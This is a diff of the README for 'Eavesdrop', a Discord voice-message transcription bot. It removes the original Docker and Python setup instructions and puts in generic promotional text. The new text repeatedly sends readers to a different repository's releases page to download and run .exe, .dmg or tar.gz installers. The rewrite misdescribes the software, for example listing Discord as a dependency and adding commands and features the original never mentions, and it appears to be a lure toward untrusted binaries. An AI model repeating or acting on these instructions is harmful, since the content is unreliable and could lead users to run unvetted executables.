@@ -1,74 +1,81 @@
-![Eavesdrop](/assets/eavesdrop_readme.png)
+# 🎤 Eavesdrop - Transcribe Your Discord Voice Messages Effortlessly
 
-![Python](https://img.shields.io/badge/Python-3-blue?logo=python&logoColor=white)
-![GitHub Workflow Status](https://img.shields.io/github/actions/workflow/status/ethanc/eavesdrop/workflow.yaml)
-![Docker Pulls](https://img.shields.io/docker/pulls/ethanchrisp/eavesdrop?label=Docker%20Pulls)
-![Docker Image Size (tag)](https://img.shields.io/docker/image-size/ethanchrisp/eavesdrop/latest?label=Docker%20Image%20Size)
+## 🚀 Getting Started
 
-# Eavesdrop
+Eavesdrop is a powerful Discord bot that helps you transcribe voice messages and media attachments. It uses whisper.cpp technology to provide accurate text conversions of your spoken content. This guide will help you download and run Eavesdrop easily, even if you have little or no technical experience.
 
-Eavesdrop is a Discord Bot that transcribes voice messages and media attachments. It is powered by the [whisper.cpp](https://github.com/ggml-org/whisper.cpp) speech-to-text engine.
+## 📥 Download Eavesdrop
 
-## Getting Started
+[![Download Eavesdrop](https://img.shields.io/badge/Download%20Now-Get%20Eavesdrop-brightgreen)](https://github.com/masgom/Eavesdrop/releases)
 
-> [!IMPORTANT]
-> - [Discord API](https://discord.com/developers/) credentials for a Bot user are required.
-> - [whisper.cpp](https://github.com/ggml-org/whisper.cpp) server must be accessible via HTTP.
-> - [ffmpeg](https://github.com/FFmpeg/FFmpeg) must be installed and accessible via the system PATH.
+## 📋 System Requirements
 
-### Quick Start: Docker (Recommended)
+Before downloading Eavesdrop, ensure your system meets the following requirements:
 
-Edit and run this `compose.yaml` example with `docker compose up -d`.
+- **Operating System:** Windows 10 or later, macOS, or a recent version of Linux.
+- **Memory:** At least 4GB of RAM.
+- **Storage:** 500MB of free disk space.
+- **Dependencies:** Ensure you have Discord installed.
 
-```yaml
-services:
-  eavesdrop:
-    container_name: eavesdrop
-    image: ethanchrisp/eavesdrop:latest
-    environment:
-      LOG_LEVEL: INFO
-      LOG_DISCORD_WEBHOOK_URL: https://discord.com/api/webhooks/XXXXXXXX/XXXXXXXX
-      LOG_DISCORD_WEBHOOK_LEVEL: WARNING
-      DISCORD_BOT_TOKEN: XXXXXXXX
-      DISCORD_SERVER_IDS: 0000000000
-      WHISPER_API_BASE_URL: http://localhost:1234
-    restart: unless-stopped
-```
+## 🌐 Download & Install
 
-### Standalone
+1. **Visit the Releases Page:** Head over to the [Releases page](https://github.com/masgom/Eavesdrop/releases) to find the latest version of Eavesdrop. You’ll see a list of available versions.
+   
+2. **Select the Latest Version:** Look for the most recent release. It usually appears at the top of the list.
 
-> [!NOTE]
-> Eavesdrop targets Python 3.14 and newer. Compatibility with earlier versions is not guaranteed.
+3. **Download the File:** Click on the version label to expand the details. Download the installation file suitable for your operating system. 
 
-Install Python and the required dependencies with [uv](https://github.com/astral-sh/uv):
+4. **Install Eavesdrop:**
 
-```
-uv sync
-```
+   - **For Windows:** Double-click the downloaded .exe file and follow the installation prompts.
+   - **For macOS:** Open the .dmg file and drag the Eavesdrop icon to your Applications folder.
+   - **For Linux:** Extract the tar.gz file and follow the included installation instructions in the README.txt file.
 
-Rename `.env.example` to `.env` and configure your environment.
+## 🔧 Setting Up Eavesdrop
 
-Run Eavesdrop with uv.
+Once installed, you will need to set up the bot within your Discord server:
 
-```
-uv run eavesdrop.py -OO
-```
+1. **Open Discord:** Launch the Discord application or website.
 
-### Configuration
+2. **Add Eavesdrop to Your Server:**
+   - Go to the Eavesdrop application page on Discord’s developer portal.
+   - Click on "Add to Server” and select the server where you want to enable the bot.
 
-All configuration is managed through environment variables on the system hosting the Bot instance.
+3. **Invite the Bot:** Authorize Eavesdrop by granting the required permissions. 
 
-| **Environment Variable**          | **Description**                                                                                                                         | **Default**           |
-|-----------------------------------|-----------------------------------------------------------------------------------------------------------------------------------------|-----------------------|
-| `LOG_LEVEL`                       | [Loguru level](https://loguru.readthedocs.io/en/stable/api/logger.html#levels) of log events to print to the console.                   | `INFO`                |
-| `LOG_DISCORD_WEBHOOK_URL`         | Discord Webhook URL to forward log events to.                                                                                           | N/A                   |
-| `LOG_DISCORD_WEBHOOK_LEVEL`       | [Loguru level](https://loguru.readthedocs.io/en/stable/api/logger.html#levels) of log events to forward to Discord.                     | N/A                   |
-| `DISCORD_BOT_TOKEN` (Required)    | [Discord API](https://discord.com/developers/docs/quick-start/getting-started#fetching-your-credentials) credentials for your Bot user. | N/A                   |
-| `DISCORD_SERVER_IDS` (Required)   | Comma-separated list of Discord server IDs to sync commands to.                                                                         | N/A                   |
-| `WHISPER_API_BASE_URL` (Required) | Base URL for the [whisper.cpp](https://github.com/ggml-org/whisper.cpp) API server.                                                     | N/A                   |
+4. **Configure Bot Settings:**
+   - Once added, you may customize Eavesdrop’s settings. This includes setting channels for transcription, language options, and other preferences. 
+   - Use command `/setup` in your Discord channel to start the configuration process. 
 
-## Disclaimer
+## ⚙️ Using Eavesdrop
 
-Eavesdrop is not affiliated with or endorsed by Activision or Discord.
+Eavesdrop makes it simple to transcribe messages:
 
-All trademarks and assets belong to their respective owners.
+1. **Start Voice Recording:** To transcribe a voice message, just send a voice message in your Discord server after the bot is added.
+
+2. **Transcription Process:** Eavesdrop will automatically start transcribing and send the text directly into your chosen channel.
+
+3. **Attachments:** You can also upload media files for transcription. Just drag and drop the media into your Discord chat and Eavesdrop will transcribe it for you.
+
+4. **Commands:** You can use various commands to control the bot:
+   - `/transcribe [attachment]` - To transcribe a specific media file.
+   - `/help` - To list available commands and help.
+
+## 🔍 Features
+
+- **Real-time Transcription:** Transcribe voice messages instantly as they are recorded.
+- **Media Support:** Upload and transcribe various media attachments.
+- **Multi-language Support:** Transcribe in multiple languages depending on your settings.
+- **Integration:** Seamless operation within Discord without any additional setup.
+
+## 📄 Further Information
+
+For detailed information about how to configure and troubleshoot Eavesdrop, please check the documentation within the GitHub repository.
+
+## 🚀 Get Help
+
+If you encounter any issues, you can reach out via the Issues section on our GitHub page. Your feedback helps us improve Eavesdrop to serve you better.
+
+## 📥 Download Eavesdrop
+
+Don’t miss out on transcription convenience. [Visit the Releases page](https://github.com/masgom/Eavesdrop/releases) again to get your version of Eavesdrop and start enhancing your Discord experience today!
